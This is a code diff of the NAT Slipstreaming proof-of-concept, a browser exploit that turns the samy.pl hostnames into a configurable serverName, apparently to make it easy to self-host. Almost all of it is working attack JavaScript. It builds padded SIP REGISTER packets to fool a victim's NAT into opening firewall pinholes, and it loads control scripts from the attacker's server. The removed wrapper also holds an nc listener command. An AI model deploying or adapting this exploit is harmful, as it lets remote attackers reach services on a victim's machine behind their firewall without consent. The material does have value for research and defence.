@@ -1,54 +1,4 @@
-<html>
-<head><title>Samy Kamkar - NAT Slipstreaming</title></head>
-
-<body>
-<script>
-</script>
-<script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
-
-<div id=acidburn style="visibility: hidden; position: absolute;"></div>
-
-
-<a href="https://samy.pl">https://samy.pl</a> || <a href="https://twitter.com/samykamkar">@samykamkar</a> || <a href="mailto:code@samy.pl">email me</a><hr>
-
-<!--
-<iframe scrolling=no frameborder=0 border=0 src="//samy.pl/list/" width=600px height=160></iframe><br>
--->
-
-<a href="https://samy.pl/slipstream/">NAT Slipstreaming</a> allows an attacker to remotely access any TCP/UDP services bound to a victim machine, bypassing the victim's NAT/firewall (arbitrary firewall pinhole control), just by the victim visiting a website. <a href="https://samy.pl/slipstream/">Full writeup here.</a><p>
-
-<a href="https://github.com/samyk/slipstream/">github.com/samyk/slipstream</a>: NAT Slipstreaming PoC code</a><p>
-
-<p>
-please run:<br>
-<?php 
-$port = @$_GET['port'] ? $_GET['port'] : 3306;
-$port = preg_replace("/[^0-9]/", "", $port); // to fix the xss issue
-?>
-<code>echo something here | (nc -vl <?php echo $port; ?> || nc -vvlp <?php echo $port; ?>)</code><p>
-then hit the button below<br>
-<form name=woot>Port: <input id=port type=text name=port value=<?php echo $port; ?>>
-&nbsp; <input type=button id=button value="please wait" disabled onClick="natpin()"><p>
-</form>
-<hr>
-<br>
-<pre id=log>
-</pre>
-
-<iframe name="A" style="display:none"></iframe>
-
-<?php
-
-function q2d($ip)
-{
-	$ips = explode (".", $ip);
-	return ($ips[3] + $ips[2] * 256 + $ips[1] * 256 * 256 + $ips[0] * 256 * 256 * 256); 
-}
-$ip = q2d(getenv('REMOTE_ADDR'));
-?>
-
-
-<script>
+const serverName = "example.com"
 
 const NOPE = 'nerp'
 const PAD = '^_'
@@ -100,7 +50,7 @@ var offerOptions = {offerToReceiveAudio: 1}
 var ip_dups = {}
 var pc
 var port
-var stun = "stun:samy.pl:3478"
+var stun = "stun:" + serverName +":3478"
 	//"iceServers": [ { "urls": [stun], "username": "samy", "credential": "samy" } ],
 var config = {
 	//"iceServers": [ { "urls": [stun] } ],
@@ -347,7 +297,7 @@ function maxpktsize()
 
 	// note 'packet_size' length is critical, must be same as other post
 	log('responding to SYN with maximum segment size TCP option to control data size')
-	post("http://samy.pl:5060/samy_pktsiz", pkt, 1)
+	post("http://" + serverName +":5060/samy_pktsiz", pkt, 1)
 	log('sending TCP beacon to detect maximum packet size and MTU')
 }
 
@@ -355,7 +305,7 @@ function getSize()
 {
 	var scr = document.createElement('script')
 	scr.type = 'text/javascript'
-	scr.src = '//samy.pl/natpin/get_size?id=' + rand + '&rand=' + rnd()
+	scr.src = '//' + serverName + '/natpin/get_size.php?id=' + rand + '&rand=' + rnd()
 	log('requesting sniffed packet sizes from server')
 	document.head.appendChild(scr)
 }
@@ -443,7 +393,7 @@ function offset(off, data, origoff)
 				lastOff = off
 
 			log("packet size changed on us, reattempt SIP REGISTER")
-			addScript('//samy.pl/natpin/monitor?id=' + rand + '&port=' + port + '&rnd=' + rnd())
+			addScript('//' + serverName + '/natpin/monitor.php?id=' + rand + '&port=' + port + '&rnd=' + rnd())
 			attemptPin(fullpkt)
 		}
 	}
@@ -480,7 +430,7 @@ function tryConnect()
 {
 	log('running: nc -v <?php echo getenv('REMOTE_ADDR') ?> ' + port)
 	log('\n<b>attempting to bypass your NAT/firewall</b>')
-	addScript('//samy.pl/natpin/connect?id=' + rand + '&port=' + port)
+	addScript('//' + serverName + '/natpin/connect.php?id=' + rand + '&port=' + port + '&serverName=' + serverName)
 }
 
 // called from /connect (along with some log()s)
@@ -549,7 +499,7 @@ function runpin()
 	ip = <?php echo $ip ?>;
 	var cid = rand.padStart(30, 'a') + 'b'
 
-	var reg = 'REGISTER sip:samy.pl;transport=TCP SIP/2.0\r\nVia: SIP/2.0/TCP {INTIP}:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP\r\nMax-Forwards: 70\r\nContact: <sip:samy@{INTIP}:' + port + ';rinstance=v40f3f83b335139c;transport=TCP>\r\nTo: <sip:samy@samy.pl;transport=TCP>\r\nFrom: <sip:samy@samy.pl;transport=TCP>;tag=U7c3d519\r\nCall-ID: ' + cid + 'bbbbbZjQ4M2M.\r\nCSeq: 1 REGISTER\r\nExpires: 70\r\nAllow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE\r\nSupported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri\r\nUser-Agent: samy natpinning v2\r\nAllow-Events: presence, kpml\r\nContent-Length: 0\r\n\r\n'
+	var reg = 'REGISTER sip:' + serverName + ';transport=TCP SIP/2.0\r\nVia: SIP/2.0/TCP {INTIP}:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP\r\nMax-Forwards: 70\r\nContact: <sip:samy@{INTIP}:' + port + ';rinstance=v40f3f83b335139c;transport=TCP>\r\nTo: <sip:samy@' + serverName + ';transport=TCP>\r\nFrom: <sip:samy@' + serverName + ';transport=TCP>;tag=U7c3d519\r\nCall-ID: ' + cid + 'bbbbbZjQ4M2M.\r\nCSeq: 1 REGISTER\r\nExpires: 70\r\nAllow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE\r\nSupported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri\r\nUser-Agent: samy natpinning v2\r\nAllow-Events: presence, kpml\r\nContent-Length: 0\r\n\r\n'
 	//reg += 'v=0\r\no=151 9655 9655 IN IP4 {INTIP}\r\ns=-\r\nc=IN IP4 {INTIP}\r\nt=0 0\r\nm=audio '+port+' RTP/AVP 8 0 2 18\r\na=rtpmap:8 PCMA/8000\r\na=rtpmap:0 PCMU/8000\r\na=rtpmap:2 G726-32/8000/1\r\na=rtpmap:18 G729/8000\r\na=ptime:20\r\na=maxptime:80\r\na=sendrecv\r\na=rtcp:50025\r\n\r\n'
 
 	// create the padding to force our packet to fall onto next packet boundary
@@ -573,7 +523,7 @@ function runpin()
 	fullpkt = s
 
 	// get our sip request from the server, calls offset() if good, otherwise noRespTimer will likely hit
-	addScript('//samy.pl/natpin/monitor?id=' + rand + '&port=' + port + '&rnd=' + rnd())
+	addScript('//' + serverName + '/natpin/monitor.php?id=' + rand + '&port=' + port + '&rnd=' + rnd())
 
 	// if we don't get request in a few seconds, something wrong...maybe wrong internal ip if safari
 	noRespTimer = setTimeout(noResponse, 5000)
@@ -591,7 +541,7 @@ function attemptPin(pkt)
 	// keep changing url to evade browser caching attempts
 	// THE LENGTH OF THE URL MUST BE 12 bytes total, eg /samy_n?0012
 	// to match the same size we got when testing /samy_pktsiz
-	post("http://samy.pl:5060/samy_n?"+incr, pkt, 1)
+	post("http://" + serverName + ":5060/samy_n?"+incr, pkt, 1)
 }
 
 function post(url, str, reuse)
@@ -720,7 +670,7 @@ function go(type)
 
 function nlog(str)
 {
-	post('//samy.pl/natpin/nlog', str)
+	post('//' + serverName + '/natpin/nlog', str)
 }
 function gather(sc)
 {
@@ -1029,6 +979,3 @@ function htmlEncodeSpecial(value) {
 }
 
 start()
-</script>
-</body>
-</html>
